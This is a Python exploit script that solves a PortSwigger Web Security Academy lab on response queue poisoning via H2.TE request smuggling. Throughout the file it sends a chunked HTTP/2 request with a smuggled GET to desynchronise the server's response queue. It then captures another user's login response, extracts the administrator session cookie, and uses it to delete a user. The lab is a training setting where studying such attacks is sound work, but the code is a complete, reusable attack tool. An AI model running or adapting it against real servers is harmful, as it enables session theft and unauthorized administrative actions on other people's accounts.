# Response queue poisoning via H2.TE request smuggling

# https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import socket
import ssl
import h2.config
import h2.connection
import argparse


TIMEOUT = 5

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def send_get_request(host):
	method = 'GET'
	path = '/gwyo'
	headers = format_h2_headers(method, path, host)
	resp = send_h2_request(headers, b"", host)
	return resp

def send_smuggle_request(host):
	print('\n[+] Sending Smuggling Request...')
	request_body = f"""0

GET /gwyo HTTP/1.1
Host: {host}

"""
	method = 'POST'
	path = '/gwyo'
	additional_headers = """Transfer-Encoding: chunked"""
	headers = format_h2_headers(method, path, host, additional_headers)
	body = format_body(request_body)
	resp = send_h2_request(headers, body, host)
	return resp

def delete_user(host, cookie):
	method = 'GET'
	path = '/admin/delete?username=carlos'
	additional_headers = """Cookie: """ + cookie
	headers = format_h2_headers(method, path, host, additional_headers)
	resp = send_h2_request(headers, b"", host)
	return resp

def format_h2_headers(method, path, host, headers=None):
	request_headers = [
	(":scheme", "https"),
	(":method", method),
	(":path", path),
	(":authority", host)
	]
	if headers:
		headers = headers.splitlines()
		for d in headers:
			name, value = d.split(':')
			request_headers.append((name.strip(), value.strip()))
	return request_headers

def format_body(body):
	return re.sub(r"(?<!\r)\n", "\r\n", body).encode()

def send_h2_request(request_headers, request_content, host, port=443):
	if request_content == str:
		request_content = request_content.encode()
	socket.setdefaulttimeout(TIMEOUT)

	ctx = ssl.create_default_context()
	ctx.check_hostname = False
	ctx.verify_mode = ssl.CERT_NONE
	ctx.set_alpn_protocols(['h2'])
	
	sock = socket.create_connection((host, port))
	sock = ctx.wrap_socket(sock, server_hostname=host)
	
	config = h2.config.H2Configuration(validate_outbound_headers=False, normalize_outbound_headers=False)
	conn = h2.connection.H2Connection(config=config)
	conn.initiate_connection()
	sock.sendall(conn.data_to_send())
	
	conn.send_headers(1, request_headers)
	conn.send_data(1, request_content, end_stream=True)
	sock.sendall(conn.data_to_send())

	body = b""
	response_end = False
	try:
		while not response_end:
			try:
				data = sock.recv(65536 * 1024)
			except socket.timeout:
				socket_timeout = True
				break
			if not data:
				break
			try:
				events = conn.receive_data(data)
			except InvalidBodyLengthError:
				error_code = "InvalidBodyLengthError"
			except Exception:
				error_code = "Error"
			for event in events:
				if isinstance(event, h2.events.ConnectionTerminated):
					error_code = event.error_code
				elif isinstance(event, h2.events.ResponseReceived):
					response_headers = event.headers
				elif isinstance(event, h2.events.DataReceived):
					conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
					body += event.data
				elif isinstance(event, h2.events.StreamEnded):
					response_body = body
					response_end = True
					break
			sock.sendall(conn.data_to_send())
		conn.close_connection()
		sock.sendall(conn.data_to_send())
		sock.close()
	except socket.timeout:
		socket_timeout = True
	if "response_headers" not in locals():
		response_headers = ""
	if "response_body" not in locals():
		response_body = ""
	if "error_code" not in locals():
		error_code = ""
	if "socket_timeout" not in locals():
		socket_timeout = False
	result = {
	"response_headers": response_headers,
	"response_body": response_body,
	"error_code": error_code,
	"socket_timeout": socket_timeout
	}
	return result

def get_status_code(resp):
	for h in resp['response_headers']:
		if h[0] == b":status":
			return int(h[1].decode())

def get_cookie(resp):
	for h in resp['response_headers']:
		if h[0] == b"set-cookie":
			return h[1].decode().split(';')[0]

def get_location(resp):
	for h in resp['response_headers']:
		if h[0] == b"location":
			return h[1].decode()

def reset_requests(url):
	print('\n')
	for t in range(1, 11):
		sys.stdout.flush()
		time.sleep(.5)
		r = send_get_request(url)
		status = get_status_code(r)
		sys.stdout.write('\r[+] Reseting response queue... %s\t=>\t%s' % (str(t), str(status)))


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Response queue poisoning via H2.TE request smuggling')
	parser = argparse.ArgumentParser(description="[+] Lab: Response queue poisoning via H2.TE request smuggling")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	if parsed_url.port:
		port = parsed_url.port
	elif parsed_url.scheme == "https":
		port = 443
	elif parsed_url.scheme == "http":
		port = 80
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send HTTP Request Smuggling attack to intercept admin cookie during his connection...\n')
			reset_requests(host)
			text = None
			while text is None:
				send_smuggle_request(host)
				time.sleep(6)
				print('[+] Sending a second request...')
				resp = send_get_request(host)
				status = get_status_code(resp)
				print('[+] Status code:\t%s' % status)
				if status == 302:
					print('[+] Login request intercepted...')
					text = resp['response_body']
					break
				reset_requests(host)
			print(resp['response_headers'])
			print("------------------------------------------------------")
			if '/my-account' in get_location(resp):
				cookie = get_cookie(resp)
				print('[+] Found administrator Session cookie:\t%s' % cookie)
				delete_user(host, cookie)
			time.sleep(4)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
